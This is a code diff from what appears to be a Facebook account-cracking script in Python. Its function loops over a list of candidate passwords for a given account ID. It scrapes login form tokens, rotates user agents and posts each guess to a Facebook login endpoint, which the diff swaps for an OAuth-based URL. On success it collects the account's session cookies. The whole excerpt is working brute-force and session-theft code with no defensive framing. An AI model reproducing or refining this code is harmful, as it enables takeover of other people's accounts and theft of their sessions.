@@ -1029,7 +1029,7 @@ def m1(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    ua = random.choice(usragent)
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get('https://free.facebook.com').text
    log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
    header_freefb =  {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
@@ -1047,7 +1047,7 @@ def m1(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=log_data,headers=header_freefb).text
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=1651644052021850&auth_token=e7a3629731362a2d6c7ea814b2096984&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1651644052021850%26redirect_uri%3Dhttps%253A%252F%252Fsnapedit-production.firebaseapp.com%252F%252Fauth%252Fhandler%26state%3DAMbdmDmYROUiY5v3qwD0FzvkmdXVHKRRBubAzhmNNtf3mDF4zTY3FFbe7tMMsWfbeX5nWCg5fx7UjGwXV8aFymGo34FRoXcERGdJ2Nvl51HrWGm7Um-mOXxtXDb4HCedrVZ3z6W14CC35hK7hCJD1qWsxgCGbi3Lh-2-qC5s1mZXf6zvVv4e-OfDfPm89xxMVSG_zjo2u5UDssxyuf6fIIbaAKr5fYEWujLqTjHGE_h8cu8b4xbDLCVtxmmq-DdzXgetxOli_2NL_JL5i6K1CkxxJ0LuT3UXb4hwOJYlihsSpL7tNVRnkljy8Wg28xCbFno-NzMbelU3N2OTkA-NrSYUzul6WQ%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fsnapedit.app%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc3dd6281-245d-4550-8022-303814f4e96b%26tp%3Dunspecified&refsrc=deprecated&app_id=1651644052021850&cancel=https%3A%2F%2Fsnapedit-production.firebaseapp.com%2F%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmYROUiY5v3qwD0FzvkmdXVHKRRBubAzhmNNtf3mDF4zTY3FFbe7tMMsWfbeX5nWCg5fx7UjGwXV8aFymGo34FRoXcERGdJ2Nvl51HrWGm7Um-mOXxtXDb4HCedrVZ3z6W14CC35hK7hCJD1qWsxgCGbi3Lh-2-qC5s1mZXf6zvVv4e-OfDfPm89xxMVSG_zjo2u5UDssxyuf6fIIbaAKr5fYEWujLqTjHGE_h8cu8b4xbDLCVtxmmq-DdzXgetxOli_2NL_JL5i6K1CkxxJ0LuT3UXb4hwOJYlihsSpL7tNVRnkljy8Wg28xCbFno-NzMbelU3N2OTkA-NrSYUzul6WQ%23_%3D_&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
